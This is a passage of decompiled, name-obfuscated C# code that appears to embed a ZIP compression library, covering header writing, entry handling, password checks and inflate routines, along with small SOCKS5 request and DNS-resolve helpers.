			int expr_203 = 8;
			int num4 = expr_203 + 1;
			arg_215_0[expr_203] = (byte)(gclass0_0.short_8 & 255);
			byte[] arg_232_0 = gclass0_0.byte_2;
			int expr_21E = 9;
			num4 = expr_21E + 1;
			arg_232_0[expr_21E] = (byte)(((int)gclass0_0.short_8 & 65280) >> 8);
			byte[] arg_251_0 = gclass0_0.byte_2;
			int expr_23F = 14;
			num4 = expr_23F + 1;
			arg_251_0[expr_23F] = (byte)(gclass0_0.int_2 & 255);
			byte[] arg_26E_0 = gclass0_0.byte_2;
			int expr_25A = 15;
			num4 = expr_25A + 1;
			arg_26E_0[expr_25A] = (byte)((gclass0_0.int_2 & 65280) >> 8);
			byte[] arg_28C_0 = gclass0_0.byte_2;
			int expr_277 = 16;
			num4 = expr_277 + 1;
			arg_28C_0[expr_277] = (byte)((gclass0_0.int_2 & 16711680) >> 16);
			byte[] arg_2AC_0 = gclass0_0.byte_2;
			int expr_295 = 17;
			num4 = expr_295 + 1;
			arg_2AC_0[expr_295] = (byte)(((long)gclass0_0.int_2 & (long)((ulong)-16777216)) >> 24);
			Class16.smethod_337(gclass0_0);
			short num5 = (short)((int)gclass0_0.byte_2[26] + (int)gclass0_0.byte_2[27] * 256);
			short num6 = (short)((int)gclass0_0.byte_2[28] + (int)gclass0_0.byte_2[29] * 256);
			if (gclass0_0.nullable_2.Value)
			{
				gclass0_0.byte_2[4] = 45;
				gclass0_0.byte_2[5] = 0;
				for (int i = 0; i < 8; i++)
				{
					gclass0_0.byte_2[num4++] = 255;
				}
				num4 = (int)(30 + num5);
				gclass0_0.byte_2[num4++] = 1;
				gclass0_0.byte_2[num4++] = 0;
				num4 += 2;
				Array.Copy(BitConverter.GetBytes(gclass0_0.long_2), 0, gclass0_0.byte_2, num4, 8);
				num4 += 8;
				Array.Copy(BitConverter.GetBytes(gclass0_0.long_0), 0, gclass0_0.byte_2, num4, 8);
			}
			else
			{
				gclass0_0.byte_2[4] = 20;
				gclass0_0.byte_2[5] = 0;
				byte[] arg_3CD_0 = gclass0_0.byte_2;
				int expr_3BA = 18;
				num4 = expr_3BA + 1;
				arg_3CD_0[expr_3BA] = (byte)(gclass0_0.long_0 & 255L);
				byte[] arg_3EB_0 = gclass0_0.byte_2;
				int expr_3D6 = 19;
				num4 = expr_3D6 + 1;
				arg_3EB_0[expr_3D6] = (byte)((gclass0_0.long_0 & 65280L) >> 8);
				byte[] arg_40A_0 = gclass0_0.byte_2;
				int expr_3F4 = 20;
				num4 = expr_3F4 + 1;
				arg_40A_0[expr_3F4] = (byte)((gclass0_0.long_0 & 16711680L) >> 16);
				byte[] arg_429_0 = gclass0_0.byte_2;
				int expr_413 = 21;
				num4 = expr_413 + 1;
				arg_429_0[expr_413] = (byte)((gclass0_0.long_0 & (long)((ulong)-16777216)) >> 24);
				byte[] arg_445_0 = gclass0_0.byte_2;
				int expr_432 = 22;
				num4 = expr_432 + 1;
				arg_445_0[expr_432] = (byte)(gclass0_0.long_2 & 255L);
				byte[] arg_463_0 = gclass0_0.byte_2;
				int expr_44E = 23;
				num4 = expr_44E + 1;
				arg_463_0[expr_44E] = (byte)((gclass0_0.long_2 & 65280L) >> 8);
				byte[] arg_482_0 = gclass0_0.byte_2;
				int expr_46C = 24;
				num4 = expr_46C + 1;
				arg_482_0[expr_46C] = (byte)((gclass0_0.long_2 & 16711680L) >> 16);
				byte[] arg_4A1_0 = gclass0_0.byte_2;
				int expr_48B = 25;
				num4 = expr_48B + 1;
				arg_4A1_0[expr_48B] = (byte)((gclass0_0.long_2 & (long)((ulong)-16777216)) >> 24);
				if (num6 != 0)
				{
					num4 = (int)(30 + num5);
					short num7 = (short)((int)gclass0_0.byte_2[num4 + 2] + (int)gclass0_0.byte_2[num4 + 3] * 256);
					if (num7 == 16)
					{
						gclass0_0.byte_2[num4++] = 153;
						gclass0_0.byte_2[num4++] = 153;
					}
				}
			}
			if (gclass0_0.enum2_0 == Enum2.const_2 || gclass0_0.enum2_0 == Enum2.const_3)
			{
				byte[] arg_51F_0 = gclass0_0.byte_2;
				int expr_518 = 8;
				num4 = expr_518 + 1;
				arg_51F_0[expr_518] = 99;
				byte[] arg_52E_0 = gclass0_0.byte_2;
				int expr_528 = 9;
				num4 = expr_528 + 1;
				arg_52E_0[expr_528] = 0;
				num4 = (int)(30 + num5);
				do
				{
					ushort num8 = (ushort)((int)gclass0_0.byte_2[num4] + (int)gclass0_0.byte_2[num4 + 1] * 256);
					short num9 = (short)((int)gclass0_0.byte_2[num4 + 2] + (int)gclass0_0.byte_2[num4 + 3] * 256);
					if (num8 != 39169)
					{
						num4 += (int)(num9 + 4);
					}
					else
					{
						num4 += 9;
						gclass0_0.byte_2[num4++] = (byte)(gclass0_0.short_8 & 255);
						gclass0_0.byte_2[num4++] = (byte)((int)gclass0_0.short_8 & 65280);
					}
				}
				while (num4 < (int)(num6 - 30 - num5));
			}
			if ((gclass0_0.short_7 & 8) != 8 || (gclass0_0.enum0_0 == Enum0.const_6 && stream_0.CanSeek))
			{
				ZipSegmentedStream zipSegmentedStream = stream_0 as ZipSegmentedStream;
				if (zipSegmentedStream != null && gclass0_0.uint_0 != zipSegmentedStream.uint_0)
				{
					using (Stream stream2 = Class16.smethod_428(gclass0_0.class8_0.gclass1_0.string_0, gclass0_0.uint_0))
					{
						stream2.Seek(gclass0_0.long_4, SeekOrigin.Begin);
						stream2.Write(gclass0_0.byte_2, 0, gclass0_0.byte_2.Length);
						goto IL_6AA;
					}
				}
				stream_0.Seek(gclass0_0.long_4, SeekOrigin.Begin);
				stream_0.Write(gclass0_0.byte_2, 0, gclass0_0.byte_2.Length);
				if (stream != null)
				{
					Class16.smethod_6((long)gclass0_0.byte_2.Length, stream);
				}
				stream_0.Seek(gclass0_0.long_0, SeekOrigin.Current);
			}
			IL_6AA:
			if ((gclass0_0.short_7 & 8) == 8 && !gclass0_0.bool_4)
			{
				byte[] array = new byte[16 + (gclass0_0.nullable_2.Value ? 8 : 0)];
				Array.Copy(BitConverter.GetBytes(134695760), 0, array, 0, 4);
				num4 = 0 + 4;
				Array.Copy(BitConverter.GetBytes(gclass0_0.int_2), 0, array, 4, 4);
				num4 = 4 + 4;
				if (gclass0_0.nullable_2.Value)
				{
					Array.Copy(BitConverter.GetBytes(gclass0_0.long_0), 0, array, num4, 8);
					num4 += 8;
					Array.Copy(BitConverter.GetBytes(gclass0_0.long_2), 0, array, num4, 8);
					num4 += 8;
				}
				else
				{
					array[num4++] = (byte)(gclass0_0.long_0 & 255L);
					array[num4++] = (byte)((gclass0_0.long_0 & 65280L) >> 8);
					array[num4++] = (byte)((gclass0_0.long_0 & 16711680L) >> 16);
					array[num4++] = (byte)((gclass0_0.long_0 & (long)((ulong)-16777216)) >> 24);
					array[num4++] = (byte)(gclass0_0.long_2 & 255L);
					array[num4++] = (byte)((gclass0_0.long_2 & 65280L) >> 8);
					array[num4++] = (byte)((gclass0_0.long_2 & 16711680L) >> 16);
					array[num4++] = (byte)((gclass0_0.long_2 & (long)((ulong)-16777216)) >> 24);
				}
				stream_0.Write(array, 0, array.Length);
				gclass0_0.int_4 += array.Length;
			}
		}

		static bool smethod_379(int int_0)
		{
			return int_0 != 67324752;
		}

		static ICollection<GClass0> smethod_380(GClass1 gclass1_0, string string_0, Class17 class17_0)
		{
			if (gclass1_0 == null)
			{
				throw new ArgumentNullException("zip");
			}
			List<GClass0> list = new List<GClass0>();
			string text = (string_0 == null) ? null : string_0.Replace("/", "\\");
			if (text != null)
			{
				while (text.EndsWith("\\"))
				{
					text = text.Substring(0, text.Length - 1);
				}
			}
			using (IEnumerator<GClass0> enumerator = gclass1_0.System.Collections.Generic.IEnumerable<ns15.GClass0>.GetEnumerator())
			{
				while (enumerator.MoveNext())
				{
					GClass0 current = enumerator.Current;
					if ((string_0 == null || Path.GetDirectoryName(current.string_1) == string_0 || Path.GetDirectoryName(current.string_1) == text) && Class16.smethod_40(class17_0, current))
					{
						list.Add(current);
					}
				}
			}
			return list;
		}

		static GClass0 smethod_381(object object_0, string string_0, Enum0 enum0_0, object object_1)
		{
			if (string.IsNullOrEmpty(string_0))
			{
				throw new ZipException("The entry name must be non-null and non-empty.");
			}
			GClass0 gClass = new GClass0();
			gClass.short_0 = 45;
			gClass.enum0_0 = enum0_0;
			gClass.dateTime_1 = (gClass.dateTime_2 = (gClass.dateTime_3 = DateTime.UtcNow));
			if (enum0_0 == Enum0.const_2)
			{
				gClass.stream_1 = (object_0 as Stream);
			}
			else if (enum0_0 == Enum0.const_4)
			{
				gClass.delegate0_0 = (object_0 as Delegate0);
			}
			else if (enum0_0 == Enum0.const_5)
			{
				gClass.delegate1_0 = (object_0 as Delegate1);
				gClass.delegate2_0 = (object_1 as Delegate2);
			}
			else if (enum0_0 != Enum0.const_6)
			{
				if (enum0_0 == Enum0.const_0)
				{
					gClass.enum0_0 = Enum0.const_1;
				}
				else
				{
					string text = object_0 as string;
					if (string.IsNullOrEmpty(text))
					{
						throw new ZipException("The filename must be non-null and non-empty.");
					}
					try
					{
						gClass.dateTime_1 = File.GetLastWriteTime(text).ToUniversalTime();
						gClass.dateTime_3 = File.GetCreationTime(text).ToUniversalTime();
						gClass.dateTime_2 = File.GetLastAccessTime(text).ToUniversalTime();
						if (File.Exists(text) || Directory.Exists(text))
						{
							gClass.int_0 = (int)File.GetAttributes(text);
						}
						gClass.bool_0 = true;
						gClass.string_0 = Path.GetFullPath(text);
					}
					catch (PathTooLongException exception_)
					{
						string string_ = string.Format("The path is too long, filename={0}", text);
						throw new ZipException(string_, exception_);
					}
				}
			}
			gClass.dateTime_0 = gClass.dateTime_1;
			gClass.string_1 = Class16.smethod_11(string_0);
			return gClass;
		}

		static int smethod_382(byte[] byte_0, Class39 class39_0)
		{
			int num = byte_0.Length;
			int sourceIndex = 0;
			if (byte_0 != null)
			{
				if (class39_0.int_19 == Class39.int_3)
				{
					class39_0.gclass2_0.uint_0 = Class16.smethod_62(class39_0.gclass2_0.uint_0, byte_0, 0, byte_0.Length);
					if (num < Class39.int_14)
					{
						return 0;
					}
					if (num > class39_0.int_23 - Class39.int_16)
					{
						num = class39_0.int_23 - Class39.int_16;
						sourceIndex = byte_0.Length - num;
					}
					Array.Copy(byte_0, sourceIndex, class39_0.byte_1, 0, num);
					class39_0.int_36 = num;
					class39_0.int_32 = num;
					class39_0.int_27 = (int)(class39_0.byte_1[0] & 255);
					class39_0.int_27 = ((class39_0.int_27 << class39_0.int_31 ^ (int)(class39_0.byte_1[1] & 255)) & class39_0.int_30);
					for (int i = 0; i <= num - Class39.int_14; i++)
					{
						class39_0.int_27 = ((class39_0.int_27 << class39_0.int_31 ^ (int)(class39_0.byte_1[i + (Class39.int_14 - 1)] & 255)) & class39_0.int_30);
						class39_0.short_0[i & class39_0.int_25] = class39_0.short_1[class39_0.int_27];
						class39_0.short_1[class39_0.int_27] = (short)i;
					}
					return 0;
				}
			}
			throw new GException0("Stream error.");
		}

		static int smethod_383(bool bool_0, int int_0, Enum20 enum20_0, GClass2 gclass2_0)
		{
			gclass2_0.enum20_0 = enum20_0;
			gclass2_0.int_4 = int_0;
			return Class16.smethod_534(bool_0, gclass2_0);
		}

		static Class74.Class78 smethod_384(Class74.Class79 class79_0)
		{
			byte[] array = new byte[class79_0.int_3];
			Array.Copy(class79_0.byte_1, 0, array, 0, class79_0.int_3);
			return new Class74.Class78(array);
		}

		static int smethod_385(int int_0)
		{
			if (int_0 >= 256)
			{
				return (int)Class47.sbyte_1[(int)(256u + ((uint)int_0 >> 7))];
			}
			return (int)Class47.sbyte_1[int_0];
		}

		static void smethod_386(string string_0, string string_1, bool bool_0, GClass1 gclass1_0, string string_2)
		{
			Class16.smethod_446(true, string_0, gclass1_0, string_2, string_1, bool_0);
		}

		static GClass0 smethod_387(GClass1 gclass1_0, GClass0 gclass0_0)
		{
			gclass0_0.class8_0 = new Class8(gclass1_0);
			gclass0_0.CompressionMethod = gclass1_0.compressionMethod_0;
			gclass0_0.CompressionLevel = gclass1_0.CompressionLevel;
			gclass0_0.ExtractExistingFile = gclass1_0.ExtractExistingFile;
			gclass0_0.ZipErrorAction = gclass1_0.ZipErrorAction;
			gclass0_0.SetCompression = gclass1_0.SetCompression;
			gclass0_0.AlternateEncoding = gclass1_0.encoding_0;
			gclass0_0.AlternateEncodingUsage = gclass1_0.enum9_0;
			gclass0_0.Password = gclass1_0.string_3;
			gclass0_0.Encryption = gclass1_0.enum2_0;
			gclass0_0.EmitTimesInWindowsFormatWhenSaving = gclass1_0.bool_2;
			gclass0_0.EmitTimesInUnixFormatWhenSaving = gclass1_0.bool_3;
			Class16.smethod_634(gclass0_0.string_1, gclass0_0, gclass1_0);
			Class16.smethod_522(gclass0_0, gclass1_0);
			return gclass0_0;
		}

		static void smethod_388(Class55 class55_0, int int_0)
		{
			class55_0.int_0 = int_0;
		}

		static void smethod_389(string string_0, string string_1, GClass0 gclass0_0, Enum3 enum3_0)
		{
			gclass0_0.ExtractExistingFile = enum3_0;
			Class16.smethod_146(string_1, string_0, gclass0_0, null);
		}

		static string smethod_390(Stream0 stream0_0)
		{
			return stream0_0.string_1;
		}

		static void smethod_391(GClass1 gclass1_0)
		{
			if (gclass1_0.string_0 != null)
			{
				if (gclass1_0.stream_1 != null)
				{
					try
					{
						gclass1_0.stream_1.Dispose();
					}
					catch (IOException)
					{
					}
				}
				gclass1_0.stream_1 = null;
				if (gclass1_0.string_4 != null)
				{
					Class16.smethod_150(gclass1_0);
					gclass1_0.string_4 = null;
				}
			}
		}

		static string smethod_392(string string_0, GClass1 gclass1_0)
		{
			if (string_0.EndsWith("\\"))
			{
				return string_0;
			}
			return string_0 + "\\";
		}

		static string smethod_393(byte[] byte_0)
		{
			return Class16.smethod_112(Class21.encoding_1, byte_0);
		}

		static EventArgs1 smethod_394(GClass0 gclass0_0, int int_0, string string_0)
		{
			return new EventArgs1(string_0, Enum6.const_5)
			{
				int_0 = int_0,
				gclass0_0 = gclass0_0
			};
		}

		static void smethod_395(GClass0 gclass0_0, Stream stream_0, [Out] long long_0, out Stream4 stream4_0, out Stream stream_1, out Stream stream_2, ref Stream13 stream13_0)
		{
			stream4_0 = new Stream4(stream_0);
			if (long_0 != 0L)
			{
				stream_1 = Class16.smethod_254(stream4_0, gclass0_0);
				stream_2 = Class16.smethod_153(long_0, gclass0_0, stream_1);
			}
			else
			{
				Stream stream;
				stream_2 = (stream = stream4_0);
				stream_1 = stream;
			}
			stream13_0 = new Stream13(stream_2, true);
		}

		static void smethod_396(GClass0 gclass0_0, string string_0)
		{
			Class16.smethod_146(".", string_0, gclass0_0, null);
		}

		static bool smethod_397(Assembly assembly_0, Assembly assembly_1)
		{
			byte[] publicKey = assembly_0.GetName().GetPublicKey();
			byte[] publicKey2 = assembly_1.GetName().GetPublicKey();
			if (publicKey2 == null != (publicKey == null))
			{
				return false;
			}
			if (publicKey2 != null)
			{
				for (int i = 0; i < publicKey2.Length; i++)
				{
					if (publicKey2[i] != publicKey[i])
					{
						return false;
					}
				}
			}
			return true;
		}

		static string smethod_398()
		{
			return Class16.smethod_34();
		}

		static int smethod_399(Class33 class33_0, byte[] byte_0, int int_0, int int_1)
		{
			if (class33_0.int_3 >= class33_0.int_4)
			{
				return 0;
			}
			int num = 0;
			int num2 = int_0 + int_1;
			int num3;
			do
			{
				num3 = Class16.smethod_365(class33_0, byte_0[int_0++]);
				if (num3 > 0)
				{
					num++;
				}
				if (int_0 >= num2)
				{
					break;
				}
			}
			while (num3 == 1);
			return num;
		}

		static Class53 smethod_400(Delegate6 delegate6_0, Class54 class54_0, string string_0)
		{
			Class53 result;
			try
			{
				Dns.BeginResolve(string_0, new AsyncCallback(class54_0.method_0), class54_0);
				result = new Class53();
			}
			catch
			{
				throw new SocketException();
			}
			return result;
		}

		static void smethod_401(Class53 class53_0, Class55 class55_0)
		{
			class55_0.class53_0 = class53_0;
		}

		static void smethod_402(Enum3 enum3_0, string string_0, GClass1 gclass1_0)
		{
			foreach (GClass0 current in Class16.smethod_227(string_0, gclass1_0))
			{
				current.Password = gclass1_0.string_3;
				Class16.smethod_106(current, enum3_0);
			}
		}

		static void smethod_403(string string_0, string string_1, GClass1 gclass1_0)
		{
			foreach (GClass0 current in Class16.smethod_506(string_1, string_0, gclass1_0))
			{
				current.Password = gclass1_0.string_3;
				Class16.smethod_33(current);
			}
		}

		static void smethod_404(GClass0 gclass0_0)
		{
			gclass0_0.bool_4 = true;
			if (!gclass0_0.string_1.EndsWith("/"))
			{
				gclass0_0.string_1 += "/";
			}
		}

		static byte[] smethod_405(int int_0, string string_0, Class57 class57_0)
		{
			if (string_0 == null)
			{
				throw new ArgumentNullException();
			}
			if (int_0 <= 0 || int_0 > 65535 || string_0.Length > 255)
			{
				throw new ArgumentException();
			}
			byte[] array = new byte[7 + string_0.Length];
			array[0] = 5;
			array[1] = 1;
			array[2] = 0;
			array[3] = 3;
			array[4] = (byte)string_0.Length;
			Array.Copy(Encoding.ASCII.GetBytes(string_0), 0, array, 5, string_0.Length);
			Array.Copy(Class16.smethod_483(int_0, class57_0), 0, array, string_0.Length + 5, 2);
			return array;
		}

		static void smethod_406(Class39 class39_0)
		{
			GClass2 arg_1C_0 = class39_0.gclass2_0;
			class39_0.gclass2_0.long_1 = 0L;
			arg_1C_0.long_0 = 0L;
			class39_0.gclass2_0.string_0 = null;
			class39_0.int_21 = 0;
			class39_0.int_20 = 0;
			class39_0.bool_0 = false;
			class39_0.int_19 = (class39_0.bool_1 ? Class39.int_3 : Class39.int_4);
			class39_0.gclass2_0.uint_0 = Class16.smethod_62(0u, null, 0, 0);
			class39_0.int_22 = 0;
			Class16.smethod_580(class39_0);
			Class16.smethod_316(class39_0);
		}

		static int smethod_407(Class54 class54_0)
		{
			return class54_0.int_0;
		}

		static bool smethod_408(Class33 class33_0, bool bool_0)
		{
			class33_0.int_5++;
			int int_ = class33_0.int_3;
			if (int_ >= class33_0.int_4 && !bool_0)
			{
				string message = string.Format("block overrun(final={2}): {0} >= threshold ({1})", int_, class33_0.int_4, bool_0);
				throw new Exception(message);
			}
			byte b = (byte)class33_0.int_1;
			byte[] byte_ = class33_0.class34_0.byte_6;
			class33_0.class34_0.bool_0[(int)b] = true;
			int num = class33_0.int_2;
			Class16.smethod_49(b, class33_0.gclass3_0, num);
			switch (num)
			{
			case 1:
				byte_[int_ + 2] = b;
				class33_0.int_3 = int_ + 1;
				break;
			case 2:
				byte_[int_ + 2] = b;
				byte_[int_ + 3] = b;
				class33_0.int_3 = int_ + 2;
				break;
			case 3:
				byte_[int_ + 2] = b;
				byte_[int_ + 3] = b;
				byte_[int_ + 4] = b;
				class33_0.int_3 = int_ + 3;
				break;
			default:
				num -= 4;
				class33_0.class34_0.bool_0[num] = true;
				byte_[int_ + 2] = b;
				byte_[int_ + 3] = b;
				byte_[int_ + 4] = b;
				byte_[int_ + 5] = b;
				byte_[int_ + 6] = (byte)num;
				class33_0.int_3 = int_ + 5;
				break;
			}
			return class33_0.int_3 >= class33_0.int_4;
		}

		static bool smethod_409(string string_0, string string_1)
		{
			bool result = false;
			try
			{
				using (GClass1 gClass = Class16.smethod_12(string_0))
				{
					using (IEnumerator<GClass0> enumerator = gClass.System.Collections.Generic.IEnumerable<ns15.GClass0>.GetEnumerator())
					{
						while (enumerator.MoveNext())
						{
							GClass0 current = enumerator.Current;
							if (!current.bool_4 && current.enum2_1 != Enum2.const_0)
							{
								Class16.smethod_136(Stream.Null, current, string_1);
							}
						}
					}
				}
				result = true;
			}
			catch (BadPasswordException)
			{
			}
			return result;
		}

		static bool smethod_410(FileAttributes fileAttributes_0, Class14 class14_0)
		{
			bool flag;
			if (flag = Class16.smethod_182(FileAttributes.Hidden, fileAttributes_0, class14_0))
			{
				flag = Class16.smethod_182(FileAttributes.System, fileAttributes_0, class14_0);
			}
			if (flag)
			{
				flag = Class16.smethod_182(FileAttributes.ReadOnly, fileAttributes_0, class14_0);
			}
			if (flag)
			{
				flag = Class16.smethod_182(FileAttributes.Archive, fileAttributes_0, class14_0);
			}
			if (flag)
			{
				flag = Class16.smethod_182(FileAttributes.NotContentIndexed, fileAttributes_0, class14_0);
			}
			if (flag)
			{
				flag = Class16.smethod_182(FileAttributes.ReparsePoint, fileAttributes_0, class14_0);
			}
			if (class14_0.comparisonOperator_0 != ComparisonOperator.EqualTo)
			{
				flag = !flag;
			}
			return flag;
		}

		static int smethod_411(Stream stream_0, GClass3 gclass3_0, Stream stream_1)
		{
			if (stream_0 == null)
			{
				throw new Exception("The input stream must not be null.");
			}
			byte[] array = new byte[8192];
			int count = 8192;
			gclass3_0.long_0 = 0L;
			int i = stream_0.Read(array, 0, 8192);
			if (stream_1 != null)
			{
				stream_1.Write(array, 0, i);
			}
			gclass3_0.long_0 += (long)i;
			while (i > 0)
			{
				Class16.smethod_507(gclass3_0, array, 0, i);
				i = stream_0.Read(array, 0, count);
				if (stream_1 != null)
				{
					stream_1.Write(array, 0, i);
				}
				gclass3_0.long_0 += (long)i;
			}
			return (int)(~(int)gclass3_0.uint_2);
		}

		static int smethod_412(Class41 class41_0, int int_0)
		{
			int num = class41_0.gclass2_0.int_0;
			int num2 = class41_0.gclass2_0.int_1;
			int num3 = class41_0.int_9;
			int i = class41_0.int_8;
			int num4 = class41_0.int_13;
			int num5 = (num4 < class41_0.int_12) ? (class41_0.int_12 - num4 - 1) : (class41_0.int_11 - num4);
			int num6;
			while (true)
			{
				switch (class41_0.enum16_0)
				{
				case Class41.Enum16.const_0:
					while (i < 3)
					{
						if (num2 == 0)
						{
							goto IL_933;
						}
						int_0 = 0;
						num2--;
						num3 |= (int)(class41_0.gclass2_0.byte_0[num++] & 255) << i;
						i += 8;
					}
					num6 = (num3 & 7);
					class41_0.int_7 = (num6 & 1);
					switch ((uint)num6 >> 1)
					{
					case 0u:
						num3 >>= 3;
						i -= 3;
						num6 = (i & 7);
						num3 >>= num6;
						i -= num6;
						class41_0.enum16_0 = Class41.Enum16.const_1;
						continue;
					case 1u:
					{
						int[] array = new int[1];
						int[] array2 = new int[1];
						int[][] array3 = new int[1][];
						int[][] array4 = new int[1][];
						Class16.smethod_492(array2, array, array3, array4, class41_0.gclass2_0);
						Class16.smethod_44(class41_0.class43_0, array[0], array2[0], array3[0], 0, array4[0], 0);
						num3 >>= 3;
						i -= 3;
						class41_0.enum16_0 = Class41.Enum16.const_6;
						continue;
					}
					case 2u:
						num3 >>= 3;
						i -= 3;
						class41_0.enum16_0 = Class41.Enum16.const_3;
						continue;
					case 3u:
						goto IL_8B7;
					default:
						continue;
					}
					break;
				case Class41.Enum16.const_1:
					while (i < 32)
					{
						if (num2 == 0)
						{
							goto IL_9FE;
						}
						int_0 = 0;
						num2--;
						num3 |= (int)(class41_0.gclass2_0.byte_0[num++] & 255) << i;
						i += 8;
					}
					if ((~num3 >> 16 & 65535) != (num3 & 65535))
					{
						goto Block_45;
					}
					class41_0.int_1 = (num3 & 65535);
					i = (num3 = 0);
					class41_0.enum16_0 = ((class41_0.int_1 != 0) ? Class41.Enum16.const_2 : ((class41_0.int_7 != 0) ? Class41.Enum16.const_7 : Class41.Enum16.const_0));
					continue;
				case Class41.Enum16.const_2:
					if (num2 == 0)
					{
						goto IL_A55;
					}
					if (num5 == 0)
					{
						if (num4 == class41_0.int_11 && class41_0.int_12 != 0)
						{
							num4 = 0;
							num5 = ((0 < class41_0.int_12) ? (class41_0.int_12 - num4 - 1) : (class41_0.int_11 - num4));
						}
						if (num5 == 0)
						{
							class41_0.int_13 = num4;
							int_0 = Class16.smethod_223(class41_0, int_0);
							num4 = class41_0.int_13;
							num5 = ((num4 < class41_0.int_12) ? (class41_0.int_12 - num4 - 1) : (class41_0.int_11 - num4));
							if (num4 == class41_0.int_11 && class41_0.int_12 != 0)
							{
								num4 = 0;
								num5 = ((0 < class41_0.int_12) ? (class41_0.int_12 - num4 - 1) : (class41_0.int_11 - num4));
							}
							if (num5 == 0)
							{
								goto IL_AAC;
							}
						}
					}
					int_0 = 0;
					num6 = class41_0.int_1;
					if (num6 > num2)
					{
						num6 = num2;
					}
					if (num6 > num5)
					{
						num6 = num5;
					}
					Array.Copy(class41_0.gclass2_0.byte_0, num, class41_0.byte_0, num4, num6);
					num += num6;
					num2 -= num6;
					num4 += num6;
					num5 -= num6;
					if ((class41_0.int_1 -= num6) == 0)
					{
						class41_0.enum16_0 = ((class41_0.int_7 != 0) ? Class41.Enum16.const_7 : Class41.Enum16.const_0);
						continue;
					}
					continue;
				case Class41.Enum16.const_3:
					while (i < 14)
					{
						if (num2 == 0)
						{
							goto IL_B77;
						}
						int_0 = 0;
						num2--;
						num3 |= (int)(class41_0.gclass2_0.byte_0[num++] & 255) << i;
						i += 8;
					}
					num6 = (class41_0.int_2 = (num3 & 16383));
					if ((num6 & 31) <= 29 && (num6 >> 5 & 31) <= 29)
					{
						num6 = 258 + (num6 & 31) + (num6 >> 5 & 31);
						if (class41_0.int_4 != null && class41_0.int_4.Length >= num6)
						{
							Array.Clear(class41_0.int_4, 0, num6);
						}
						else
						{
							class41_0.int_4 = new int[num6];
						}
						num3 >>= 14;
						i -= 14;
						class41_0.int_3 = 0;
						class41_0.enum16_0 = Class41.Enum16.const_4;
						goto IL_411;
					}
					goto IL_B03;
				case Class41.Enum16.const_4:
					goto IL_411;
				case Class41.Enum16.const_5:
					goto IL_2C8;
				case Class41.Enum16.const_6:
					goto IL_56;
				case Class41.Enum16.const_7:
					goto IL_E39;
				case Class41.Enum16.const_8:
					goto IL_EE0;
				case Class41.Enum16.const_9:
					goto IL_F3A;
				}
				goto Block_51;
				while (true)
				{
					IL_2C8:
					num6 = class41_0.int_2;
					if (class41_0.int_3 >= 258 + (num6 & 31) + (num6 >> 5 & 31))
					{
						break;
					}
					num6 = class41_0.int_5[0];
					while (i < num6)
					{
						if (num2 == 0)
						{
							goto IL_D65;
						}
						int_0 = 0;
						num2--;
						num3 |= (int)(class41_0.gclass2_0.byte_0[num++] & 255) << i;
						i += 8;
					}
					num6 = class41_0.int_10[(class41_0.int_6[0] + (num3 & Class42.int_0[num6])) * 3 + 1];
					int num7 = class41_0.int_10[(class41_0.int_6[0] + (num3 & Class42.int_0[num6])) * 3 + 2];
					if (num7 < 16)
					{
						num3 >>= num6;
						i -= num6;
						class41_0.int_4[class41_0.int_3++] = num7;
					}
					else
					{
						int num8 = (num7 == 18) ? 7 : (num7 - 14);
						int num9 = (num7 == 18) ? 11 : 3;
						while (i < num6 + num8)
						{
							if (num2 == 0)
							{
								goto IL_D0E;
							}
							int_0 = 0;
							num2--;
							num3 |= (int)(class41_0.gclass2_0.byte_0[num++] & 255) << i;
							i += 8;
						}
						num3 >>= num6;
						i -= num6;
						num9 += (num3 & Class42.int_0[num8]);
						num3 >>= num8;
						i -= num8;
						num8 = class41_0.int_3;
						num6 = class41_0.int_2;
						if (num8 + num9 > 258 + (num6 & 31) + (num6 >> 5 & 31) || (num7 == 16 && num8 < 1))
						{
							goto IL_C93;
						}
						num7 = ((num7 == 16) ? class41_0.int_4[num8 - 1] : 0);
						do
						{
							class41_0.int_4[num8++] = num7;
						}
						while (--num9 != 0);
						class41_0.int_3 = num8;
					}
				}
				class41_0.int_6[0] = -1;
				int[] array5 = new int[]
				{
					9
				};
				int[] array6 = new int[]
				{
					6
				};
				int[] array7 = new int[1];
				int[] array8 = new int[1];
				num6 = class41_0.int_2;
				Class45 class45_ = class41_0.class45_0;
				int[] int_ = class41_0.int_4;
				int[] int_2 = class41_0.int_10;
				GClass2 gclass2_ = class41_0.gclass2_0;
				num6 = Class16.smethod_462(array5, 1 + (num6 >> 5 & 31), int_, gclass2_, array6, int_2, class45_, 257 + (num6 & 31), array7, array8);
				if (num6 == 0)
				{
					Class16.smethod_44(class41_0.class43_0, array5[0], array6[0], class41_0.int_10, array7[0], class41_0.int_10, array8[0]);
					class41_0.enum16_0 = Class41.Enum16.const_6;
					goto IL_56;
				}
				goto IL_DBC;
				IL_411:
				while (class41_0.int_3 < 4 + (class41_0.int_2 >> 10))
				{
					while (i < 3)
					{
						if (num2 == 0)
						{
							goto IL_C3C;
						}
						int_0 = 0;
						num2--;
						num3 |= (int)(class41_0.gclass2_0.byte_0[num++] & 255) << i;
						i += 8;
					}
					class41_0.int_4[Class41.int_0[class41_0.int_3++]] = (num3 & 7);
					num3 >>= 3;
					i -= 3;
				}
				while (class41_0.int_3 < 19)
				{
					class41_0.int_4[Class41.int_0[class41_0.int_3++]] = 0;
				}
				class41_0.int_5[0] = 7;
				Class45 class45_2 = class41_0.class45_0;
				int[] int_3 = class41_0.int_4;
				int[] int_4 = class41_0.int_5;
				int[] int_5 = class41_0.int_6;
				int[] int_6 = class41_0.int_10;
				GClass2 gclass2_2 = class41_0.gclass2_0;
				num6 = Class16.smethod_436(int_5, int_4, int_6, int_3, gclass2_2, class45_2);
				if (num6 == 0)
				{
					class41_0.int_3 = 0;
					class41_0.enum16_0 = Class41.Enum16.const_5;
					goto IL_2C8;
				}
				goto IL_BCE;
				IL_56:
				class41_0.int_9 = num3;
				class41_0.int_8 = i;
				class41_0.gclass2_0.int_1 = num2;
				class41_0.gclass2_0.long_0 += (long)(num - class41_0.gclass2_0.int_0);
				class41_0.gclass2_0.int_0 = num;
				class41_0.int_13 = num4;
				int_0 = Class16.smethod_2(class41_0, int_0, class41_0.class43_0);
				if (int_0 != 1)
				{
					break;
				}
				int_0 = 0;
				num = class41_0.gclass2_0.int_0;
				num2 = class41_0.gclass2_0.int_1;
				num3 = class41_0.int_9;
				i = class41_0.int_8;
				num4 = class41_0.int_13;
				num5 = ((num4 < class41_0.int_12) ? (class41_0.int_12 - num4 - 1) : (class41_0.int_11 - num4));
				if (class41_0.int_7 != 0)
				{
